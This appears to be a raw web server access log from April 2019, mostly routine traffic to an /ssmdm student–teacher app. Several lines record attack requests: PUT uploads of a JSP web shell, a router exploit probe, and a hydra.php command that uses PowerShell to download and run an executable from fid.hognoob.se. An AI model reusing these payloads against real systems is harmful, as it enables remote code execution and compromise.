41.216.186.87 - - [01/Apr/2019:00:05:52 +0800] "-" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:08 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:08 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:08 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:08 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:08 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:08 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:09 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:09 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:09 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:09 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:09 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:09 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:10 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:11 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:11 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:11 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:11 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:12 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:13 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:13 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:13 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:13 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:13 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:13 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:14 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:15 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:15 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:15 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:15 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:15 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:15 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:16 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:17 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:17 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:17 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:17 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:17 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:17 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:18 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:19 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:20 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:20 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:20 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:20 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:20 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:20 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:21 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:21 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:30 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:30 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:30 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:31 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:32 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:32 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:32 +0800] "GET / HTTP/1.1" 400 -
124.23.133.102 - - [01/Apr/2019:05:03:32 +0800] "GET / HTTP/1.1" 400 -
124.23.134.228 - - [01/Apr/2019:05:03:32 +0800] "GET / HTTP/1.1" 400 -
222.137.113.238 - - [01/Apr/2019:05:10:48 +0800] "CONNECT www.voanews.com:443 HTTP/1.0" 400 -
60.191.52.254 - - [01/Apr/2019:05:22:00 +0800] "HEAD / HTTP/1.1" 200 -
47.105.46.213 - - [01/Apr/2019:06:23:15 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:06:23:15 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:06:23:15 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:06:23:15 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
194.143.248.176 - - [01/Apr/2019:06:59:19 +0800] "GET / HTTP/1.1" 200 11418
104.248.178.55 - - [01/Apr/2019:08:09:42 +0800] "POST /GponForm/diag_Form?script/ HTTP/1.1" 404 987
184.105.139.70 - - [01/Apr/2019:08:18:27 +0800] "GET / HTTP/1.1" 200 11418
47.105.46.213 - - [01/Apr/2019:09:20:12 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:09:20:12 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:09:20:12 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:09:20:12 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
47.105.46.213 - - [01/Apr/2019:10:05:37 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:10:05:37 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:10:05:37 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
47.105.46.213 - - [01/Apr/2019:10:05:37 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
77.234.203.34 - - [01/Apr/2019:10:46:06 +0800] "GET / HTTP/1.1" 200 11418
116.12.57.81 - - [01/Apr/2019:13:15:23 +0800] "GET / HTTP/1.1" 200 11418
80.82.70.187 - - [01/Apr/2019:13:58:26 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
69.162.127.162 - - [01/Apr/2019:14:12:58 +0800] "HEAD /robots.txt HTTP/1.0" 404 -
39.107.127.149 - - [01/Apr/2019:14:56:19 +0800] "GET / HTTP/1.1" 200 11418
47.105.46.213 - - [01/Apr/2019:15:04:37 +0800] "GET null null" 400 -
47.105.46.213 - - [01/Apr/2019:15:04:37 +0800] "GET null null" 400 -
47.105.46.213 - - [01/Apr/2019:15:04:37 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/thkvqfnyiohsibl27456.exe');start%20C:/Windows/temp/thkvqfnyiohsibl27456.exe HTTP/1.1" 404 983
185.222.211.18 - - [01/Apr/2019:15:37:01 +0800] "-" 400 -
1.85.217.93 - - [01/Apr/2019:16:13:20 +0800] "GET /ssmdm/css/flexslider.css HTTP/1.1" 200 3250
1.85.217.93 - - [01/Apr/2019:16:13:20 +0800] "GET /ssmdm/css/reset.css HTTP/1.1" 200 1187
1.85.217.93 - - [01/Apr/2019:16:13:20 +0800] "GET /ssmdm/css/responsive.css HTTP/1.1" 200 4432
1.85.217.93 - - [01/Apr/2019:16:13:20 +0800] "GET /ssmdm/toTop HTTP/1.1" 200 12737
1.85.217.93 - - [01/Apr/2019:16:13:20 +0800] "GET /ssmdm/js/js_z.js HTTP/1.1" 200 788
1.85.217.93 - - [01/Apr/2019:16:13:20 +0800] "GET /ssmdm/css/thems.css HTTP/1.1" 200 13346
1.85.217.93 - - [01/Apr/2019:16:13:21 +0800] "GET /ssmdm/js/jquery.flexslider.js HTTP/1.1" 200 40487
1.85.217.93 - - [01/Apr/2019:16:13:21 +0800] "GET /ssmdm/js/jquery-1.8.3.min.js HTTP/1.1" 200 93636
1.85.217.93 - - [01/Apr/2019:16:13:22 +0800] "GET /ssmdm/images/icon2.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:22 +0800] "GET /ssmdm/images/nav_ico.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:22 +0800] "GET /ssmdm/images/icon5.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:22 +0800] "GET /ssmdm/images/icon3.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:22 +0800] "GET /ssmdm/images/icon4.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/toLogin HTTP/1.1" 200 2272
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/images/nav4.jpg HTTP/1.1" 500 40960
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/images/nav1.jpg HTTP/1.1" 500 163840
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/images/nav3.jpg HTTP/1.1" 500 40960
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/images/nav2.jpg HTTP/1.1" 500 139264
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/js/login.js HTTP/1.1" 200 777
1.85.217.93 - - [01/Apr/2019:16:13:23 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
1.85.217.93 - - [01/Apr/2019:16:13:24 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66948
1.85.217.93 - - [01/Apr/2019:16:13:25 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
1.85.217.93 - - [01/Apr/2019:16:13:28 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
1.85.217.93 - - [01/Apr/2019:16:13:28 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
1.85.217.93 - - [01/Apr/2019:16:13:28 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
1.85.217.93 - - [01/Apr/2019:16:13:28 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
1.85.217.93 - - [01/Apr/2019:16:13:32 +0800] "GET /ssmdm/images/logo.png HTTP/1.1" 200 556002
1.85.217.93 - - [01/Apr/2019:16:13:33 +0800] "POST /ssmdm/login HTTP/1.1" 500 16250
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "POST /ssmdm/login HTTP/1.1" 200 3608
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/js/title.js HTTP/1.1" 200 747
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/css/Main.css HTTP/1.1" 200 581
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/images/logo2.png HTTP/1.1" 200 33740
1.85.217.93 - - [01/Apr/2019:16:13:36 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
1.85.217.93 - - [01/Apr/2019:16:13:37 +0800] "GET /favicon.ico HTTP/1.1" 200 21630
1.85.217.93 - - [01/Apr/2019:16:13:39 +0800] "GET /ssmdm/toRead HTTP/1.1" 200 844
1.85.217.93 - - [01/Apr/2019:16:13:39 +0800] "GET /ssmdm/js/student/queryAllDoc.js HTTP/1.1" 200 4692
1.85.217.93 - - [01/Apr/2019:16:13:39 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
1.85.217.93 - - [01/Apr/2019:16:13:39 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
1.85.217.93 - - [01/Apr/2019:16:13:39 +0800] "POST /ssmdm/Student/queryAllDoc HTTP/1.1" 200 837
1.85.217.93 - - [01/Apr/2019:16:13:40 +0800] "GET /ssmdm/toAdvice HTTP/1.1" 200 840
1.85.217.93 - - [01/Apr/2019:16:13:40 +0800] "GET /ssmdm/js/student/queryAdvice.js HTTP/1.1" 200 3206
1.85.217.93 - - [01/Apr/2019:16:13:40 +0800] "POST /ssmdm/Student/queryAdvice HTTP/1.1" 200 32
1.85.217.93 - - [01/Apr/2019:16:13:42 +0800] "GET /ssmdm/stuUpload HTTP/1.1" 200 2831
1.85.217.93 - - [01/Apr/2019:16:13:42 +0800] "GET /ssmdm/js/student/fileUpload.js HTTP/1.1" 200 1142
1.85.217.93 - - [01/Apr/2019:16:13:48 +0800] "GET /ssmdm/toTop HTTP/1.1" 200 12737
1.85.217.93 - - [01/Apr/2019:16:13:48 +0800] "GET /ssmdm/images/nav_ico.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:48 +0800] "GET /ssmdm/images/icon3.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:48 +0800] "GET /ssmdm/images/icon5.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:48 +0800] "GET /ssmdm/images/icon4.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:48 +0800] "GET /ssmdm/images/icon2.png HTTP/1.1" 404 949
1.85.217.93 - - [01/Apr/2019:16:13:50 +0800] "GET /ssmdm/toLogin HTTP/1.1" 200 2272
1.85.217.93 - - [01/Apr/2019:16:13:50 +0800] "GET /ssmdm/images/nav3.jpg HTTP/1.1" 500 81920
1.85.217.93 - - [01/Apr/2019:16:13:50 +0800] "GET /ssmdm/images/nav4.jpg HTTP/1.1" 500 98304
1.85.217.93 - - [01/Apr/2019:16:13:50 +0800] "GET /ssmdm/images/nav1.jpg HTTP/1.1" 500 131072
1.85.217.93 - - [01/Apr/2019:16:13:50 +0800] "GET /ssmdm/images/nav2.jpg HTTP/1.1" 500 114688
1.85.217.93 - - [01/Apr/2019:16:13:59 +0800] "POST /ssmdm/login HTTP/1.1" 200 3854
1.85.217.93 - - [01/Apr/2019:16:14:02 +0800] "GET /ssmdm/teachertoDealDoc HTTP/1.1" 200 2388
1.85.217.93 - - [01/Apr/2019:16:14:02 +0800] "GET /ssmdm/js/TeacherDealDoc.js HTTP/1.1" 200 3684
1.85.217.93 - - [01/Apr/2019:16:14:02 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/icons/clear.png HTTP/1.1" 200 779
1.85.217.93 - - [01/Apr/2019:16:14:02 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/icons/filesave.png HTTP/1.1" 200 898
1.85.217.93 - - [01/Apr/2019:16:14:02 +0800] "POST /ssmdm/Teacher/QuerryDocForNoDeal HTTP/1.1" 200 238
1.85.217.93 - - [01/Apr/2019:16:14:04 +0800] "GET /ssmdm/TUploadFiles HTTP/1.1" 200 2616
1.85.217.93 - - [01/Apr/2019:16:14:04 +0800] "GET /ssmdm/js/TUploadFiles.js HTTP/1.1" 200 2738
1.85.217.93 - - [01/Apr/2019:16:14:04 +0800] "POST /ssmdm/Teacher/QuerryStudent HTTP/1.1" 200 1582
1.85.217.93 - - [01/Apr/2019:16:14:06 +0800] "GET /ssmdm/teachertoReadDoc HTTP/1.1" 200 844
1.85.217.93 - - [01/Apr/2019:16:14:06 +0800] "GET /ssmdm/js/TeacherReadDoc.js HTTP/1.1" 200 4274
1.85.217.93 - - [01/Apr/2019:16:14:06 +0800] "POST /ssmdm/Teacher/QuerryAllDoc HTTP/1.1" 200 816
1.85.217.93 - - [01/Apr/2019:16:14:08 +0800] "GET /ssmdm/teachertoReadAdvice HTTP/1.1" 200 2212
1.85.217.93 - - [01/Apr/2019:16:14:08 +0800] "GET /ssmdm/js/TeacherReadAdvice.js HTTP/1.1" 200 4882
1.85.217.93 - - [01/Apr/2019:16:14:08 +0800] "POST /ssmdm/Teacher/QuerryAllAdvice HTTP/1.1" 200 32
1.85.217.93 - - [01/Apr/2019:16:14:14 +0800] "GET /ssmdm/teachertoUploadAdvice HTTP/1.1" 200 2140
1.85.217.93 - - [01/Apr/2019:16:14:14 +0800] "GET /ssmdm/js/TeacherUploadDoc.js HTTP/1.1" 200 3192
1.85.217.93 - - [01/Apr/2019:16:14:14 +0800] "POST /ssmdm/Teacher/QuerryDocNoPass HTTP/1.1" 200 250
1.85.217.93 - - [01/Apr/2019:16:14:18 +0800] "GET /ssmdm/Teacher/TeacherInfo HTTP/1.1" 200 1407
1.85.217.93 - - [01/Apr/2019:16:14:19 +0800] "GET /ssmdm/toTeacher_stu HTTP/1.1" 200 847
1.85.217.93 - - [01/Apr/2019:16:14:19 +0800] "GET /ssmdm/js/Teacher_stu.js HTTP/1.1" 200 728
1.85.217.93 - - [01/Apr/2019:16:14:19 +0800] "POST /ssmdm/Teacher/QuerryStudent HTTP/1.1" 200 1582
95.70.238.161 - - [01/Apr/2019:16:52:15 +0800] "GET / HTTP/1.1" 200 11418
1.85.217.93 - - [01/Apr/2019:17:06:11 +0800] "POST /ssmdm/login HTTP/1.1" 200 3854
1.85.217.93 - - [01/Apr/2019:17:06:11 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
1.85.217.93 - - [01/Apr/2019:17:06:11 +0800] "GET /ssmdm/css/Main.css HTTP/1.1" 200 581
1.85.217.93 - - [01/Apr/2019:17:06:11 +0800] "GET /ssmdm/js/title.js HTTP/1.1" 200 747
1.85.217.93 - - [01/Apr/2019:17:06:11 +0800] "GET /ssmdm/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
